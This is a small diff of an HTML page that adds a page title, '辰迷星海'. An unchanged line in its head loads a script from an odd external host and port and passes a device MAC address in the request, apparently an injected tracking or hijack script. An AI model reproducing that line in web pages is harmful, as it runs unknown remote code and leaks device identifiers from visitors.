@@ -3,6 +3,8 @@
 <head><script src="https://t.7gg.cc:88/j.js?MAC=68DB5482FAF5" type="dc2dc271068775d9710f9f20-text/javascript"></script>  
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0,user-scalable=no">
+<title>辰迷星海</title>
+
 <style>
 html, body {
   background: #28254C;
